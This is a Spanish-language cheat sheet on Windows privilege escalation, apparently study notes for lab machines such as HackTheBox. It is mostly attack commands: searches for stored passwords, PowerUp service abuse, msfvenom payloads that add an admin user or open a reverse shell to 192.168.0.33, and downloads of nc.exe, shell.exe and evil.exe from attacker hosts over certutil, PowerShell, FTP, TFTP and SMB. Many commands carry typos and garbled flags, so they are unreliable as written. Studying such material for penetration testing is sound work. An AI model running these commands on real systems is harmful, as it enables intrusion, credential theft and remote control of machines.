### Windows

- Identificación sistema:
  - `Systeminfo: systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
  - `C:\\/Windows/System32/eula.txt
- Servicios: `nestat -ano`
- Quién soy? `Whoami` / `echo %username%`
- Tareas: `schtasks` / `query /fo LIST /v`
- Procesos: `tasklist /SVC`
- Firewall Windows:
  - State: `netsh firewall show state`
  - Conf: `netsh firewall show config`
- Patches: - Powershell `Get-HotFix`
- Búsquedas interesantes:
  - `c:\syspref.inf`
  - `c:\sysprep\sysprep.xml`
  - `%WINDIR%\Panther\Unattend\Unattended.xml`
  - `%WINDIR%\Panther\Unattended.xml`
  - `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\` (Si está en AD)
- Búsqueda contraseñas, ficheros de config:
  - `dir /s *pass* == *cred* == *vnc* == *.config*`
  - `findstr /si password *.xml *.ini *.txt`

- Check
- ﻿﻿Vulnerabilidades más comunes
- ﻿﻿Transferencia ficheros
- ﻿﻿Herramientas de apoyo

- Vulnerabilidades comunes:
  - ﻿﻿Ausencia parches de seguridad (PrinterNightMare)
  - ﻿﻿Arranque de servicios automáticos o credenciales en texto
  - plano debido a autologon.
  - ﻿﻿Servicios mal configurados.
  - `﻿﻿AlwaysInstalledElevated`.
  - ﻿﻿Permisos débiles en servicios.
  - ﻿﻿DLL Hijacking
  - ﻿﻿LOLBAS
- PowerUp
  - ﻿﻿`Invoke AllChecks` - Revisar todo.
  - `﻿﻿Get-ServiceUnquoted` - Ficheros con espacios en rutas sin el doble entrecomillado.
  - ﻿﻿`Get-ModifiableServiceFile` - Servicios donde el usuario actual puede escribir la ruta del binario.
- `﻿﻿Get-ModifiableService` - Servicios modificables por el usuario actual.
- ﻿﻿Estado de los programas - `Get-mmiobiect -class win32_service / fl *`
- ﻿﻿Filtrando por rutas - `Get-wmiobject -class win32_service / select pathname`
- Unquoted paths: `Invoke-ServiceAbuse -Name <serviceName> -Username UCANM\n4x`

#### EoP - `AlwaysInstallEvelated`

- Esta política permite a los usuarios estándar instalar apps que requieren acceso a directorios y claves de registro que normalmente no tienen permiso para cambiar. Esto equivale a conceder derechos administrativos completos.
- ## Comprobar si los siguientes registros tienen valor '1': - `reg query HKCU\SOFTWARE \Policies\Microsoft\Windows \Installer /v AlwaysInstallElevated`
  `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
  - `﻿﻿Get-ItemProperty HKLM\Software Policies \Microsoft|Windows Installer`
  -
  `﻿﻿Get-ItemProperty HKCU\Software \Policies \Microsoft|Windows \Installer`
- ## Para explotarlo se crea el siguiente payload: - `msfvenom - p windows/adduser USER=n4x PASS=Superadmin123! -f msi -o reverse.msi`
  ## `﻿﻿msfvenom - p windows/adduser USER=n4x PASS=Superadmin123! -f msi- nouac -o reverse.msi`
  `﻿﻿msfvenom -p windows/shell reverse top Ihost=192.168.0.33 leort=443 -f msi > reverse.msi`
- ﻿﻿Se ejecuta el siguiente payload en la máquina: `msiexec /quiet /an /i` `C: \reverse.msi`

### Permisos débiles en servicios:

- ﻿﻿Existencia de servicios con permisos modificables
- `Get-ServiteAd-Name Vuln-Service-2 | select -expandproperty Access`
  - `ServiceRights : ChangeConfig, Start, Stop`
  - `AccessControlType : AccessAllowed`
  - `IdentityReference : NT AUTHORITY\ Authenticated Users`
  - `Isinherited : False`
  - `InheritanceFlags : None`
  - `PropagationFlags : None`

- Permisos en ficheros ejecutables:
  - Existencia de binaries que pueden ser accesibles por cualquier y impersonalizados.
  - Idem para programas de auto-arranque

- Si tiene Python, se podía transferir `wget.exe`:

```pwsh
c:\Python27\python.exe -c "exec(\"import
	"urllib:urllib.urlretrieve('http://10.10.0.98/wget.exe',
	'C:\wmpub\wmiislog\wget.exe'\")"
```

- Si tiene powershell (> Windows Vista)
  - `powershell System.Net.WebClient.DownloadFile(http://10.10.10.98/AppCompatCache.exe', 'C:\Users\Antonio\Desktop\AppCompatCache.exe')"`
  - `﻿﻿powershell -c 'Invoke-WebRequest "http://IP/nc.exe" -OutFile <file>'`

Si no tiene powershell ni python — **LOLBAS**:

- `﻿﻿certutil -urlcache -spit -f "http://10.10.14.63/shell.exe" "C:\Users\security\shell.exe"`

Mediante **FTP**:

- Instalar un FTP en la máquina atacante (pure-ftpd)
- Desde la máquina víctima:
  - `C:\wmpub>echo open 10.10.10.63 21 > esftp.txt`
  - `C:\wmpub>echo USER no0b noob >> esftp.txt`
  - `C:\wmpub>echo bin >> esftp.txt`
  - `C:\wmpub> echo GET exploit. exe >> esftp.txt`
  - `C:\wmpub>echo bye >> esftp.txt`
  - `C:\wmpub>ftp -v -n -s:esftp.txt)`

- ﻿﻿Mediante TFTP (port 69/UDP):
  - ﻿﻿TFTP: Se ejecuta bajo UDP. Por defecto, viene instalado en Windows XP and 2003 (windows server). Mientras. que en Windows 7 y Windows server 2008, no viene por defecto y requiere que se añada manualmente.
  - ﻿﻿Desde la Kali:
    - `mkdir /tftp`
    - `root@kali:~# atftod --daemon --port 69 /tfto`
    - `root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/`
    - Desde Windows: `tftp -i 10.10.10.63 get nc.exe`
- Para sistemas obsoletos:
  - `﻿﻿Debug.exe`: Para máquinas 32 bits (No recomendada).
  - `﻿﻿VBScript`: En Windows XP y WinServ2k3 y Powershell (desde windows 7 y winServ2k9 en adelante). Similar a la FTP.
  - `c﻿escript wget.vbs http://10.10.10.5/evil.exe`
- Herramientas de enumeración interna
  - ﻿﻿PowerUp - https://github.com/PowerShellMafia/PowerSploit
  - ﻿﻿Sherlock (deprecated) - https://github.com/rasta-mouse/Sherlock
  - ﻿﻿Windows-Exploit-Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
  - ﻿﻿Windows Enum - https://github.com/absolomb/WindowsEnum
  - [BEST] **﻿﻿WinPeas - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe**
  - [BEST] **PrivescCheck - https://github.com/itm4n/PrivescCheck**
  - Watson - https://github.com/rasta-mouse/Watson
  - ﻿﻿Seatbelt - https://github.com/GhostPack/Seatbelt
  - ﻿﻿Powerless (OSCP Legacy) - https://github.com/gladiatx0r/Powerless
  - ﻿﻿BeRoot - https://github.com/AlessandroZ/BeRoot
  - ﻿﻿JAWS - https://github.com/411Hall/JAWS
  - ﻿﻿Repositorio Exploits Windows - https://github.com/abatchy17/WindowsExploits
  - https://github.com/swisskyrepo/PayloadsAllTheThings
  - https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
  - https://github.com/RedTeamOperations/Vulnerable_Machine
  - https://github.com/sagishahar/lpeworkshop
  - https://attack.stealthbits.com/plaintext-passwords-sysvol-group-policy-preferences

- Máquinas recomendadas HTB
  - ﻿﻿Artic
  - ﻿﻿Devel
  - ﻿﻿SecNotes
  - ﻿﻿Bastard
  - ﻿﻿Jeeves
  - ﻿﻿Access
  - ﻿﻿ServMon
  - ﻿﻿Remote
  - ﻿﻿Resolute
  - Json

## Walkthrough

- `powershell -ep bypass`
- `./PowerUp.ps1`
- `Import-Module ./PowerUp.ps1`
- `Invoke-AllChecks`
- `certutil -urlcache -f -split <url>` / `curl`

### SMB Server

- SMB Server
- ﻿﻿Mediante `smbsever.py` de `impacket` (https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) es posible arrancar un servicio de SMB para compartir ficheros.
  - In the attack machine: `python3 smbserver.v <SHARE_NAME> <PATH>`
  - In the Windows victim:
    - `﻿﻿net view I/P_ attack machine`
    - ﻿﻿Copy file: `copy \\IP_ attack_machine|SHARE_NAME \nc.exe`
